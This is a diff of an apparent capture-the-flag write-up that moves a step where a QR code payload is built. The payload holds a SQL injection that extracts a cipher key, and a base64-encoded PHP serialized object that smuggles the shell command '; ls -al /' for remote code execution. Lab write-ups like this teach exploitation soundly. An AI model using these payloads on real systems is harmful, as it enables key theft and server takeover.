@@ -137,11 +137,7 @@ I will explain the added part:
 
 ## **Step 5: Create your most beautiful object!**
 
-*qrencode '{"uid":"1000000000 union select 1,2,(SELECT cipher_key FROM cipher_keys LIMIT 1),4","t_id":"1","object":"Tzo2OiJUaWNrZXQiOjM6e3M6NzoiSGlzdG9yeSI7Tzo3OiJIaXN0b3J5IjoyOntzOjg6ImZpbGVuYW1lIjtzOjE3OiIvaGlzdG9yeS90b3RvLnBuZyI7czo0OiJkYXRhIjtzOjEyOiI7IGxzIC1hbCAvIDsiO31zOjU6Im1vdmllIjtOO3M6NDoicm9vbSI7Tjt9","sign":"48f08ca268e7d77625494b9186d953ac4a53dd7fe37de2345d1ef4a65a242749"}' -o - | base64 -w 0*
-**Object**: contain the Ticket instance
-**Sign**: hmac_mac of the object using the key
-
-The output will be like:
+The output of the modified php file will be like:
 
 ![test_id_rce](/test_id_rce.png)
 
@@ -150,6 +146,12 @@ The output will be like:
 Let's analyze the server in order to get the flag and finaly have a break to drink a bit!
 
 ![laroot](/laroot.png)
+
+Let's create the QRCode for this:
+
+*qrencode '{"uid":"1000000000 union select 1,2,(SELECT cipher_key FROM cipher_keys LIMIT 1),4","t_id":"1","object":"Tzo2OiJUaWNrZXQiOjM6e3M6NzoiSGlzdG9yeSI7Tzo3OiJIaXN0b3J5IjoyOntzOjg6ImZpbGVuYW1lIjtzOjE3OiIvaGlzdG9yeS90b3RvLnBuZyI7czo0OiJkYXRhIjtzOjEyOiI7IGxzIC1hbCAvIDsiO31zOjU6Im1vdmllIjtOO3M6NDoicm9vbSI7Tjt9","sign":"48f08ca268e7d77625494b9186d953ac4a53dd7fe37de2345d1ef4a65a242749"}' -o - | base64 -w 0*
+**Object**: contain the Ticket instance
+**Sign**: hmac_mac of the object using the key
 
 ![outputflag](/outputflag.png)
 
